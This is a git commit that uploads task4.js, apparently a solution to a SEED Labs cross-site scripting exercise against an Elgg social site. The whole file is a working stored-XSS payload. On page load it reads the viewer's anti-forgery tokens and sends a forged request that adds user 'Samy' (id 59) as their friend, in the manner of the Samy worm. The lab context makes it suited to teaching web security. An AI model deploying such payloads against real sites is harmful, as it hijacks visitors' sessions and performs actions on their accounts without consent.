bfa8823be819f156e45179f11aa023423af81249
Zephyr <152149488+xiangqinzhang@users.noreply.github.com>
2024-11-10 15:03:51 +0800

    Add files via upload

---
+++ task4.js
@@ -0,0 +1,16 @@
+<script type="text/javascript">
+window.onload = function () {
+ var Ajax=null;
+
+ var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+ var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+ //Construct the HTTP request to add Samy as a friend.
+ var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token; //FILL IN
+
+ //Create and send Ajax request to add friend
+ Ajax=new XMLHttpRequest();
+ Ajax.open("GET", sendurl, true);
+ Ajax.send();
+}
+</script>
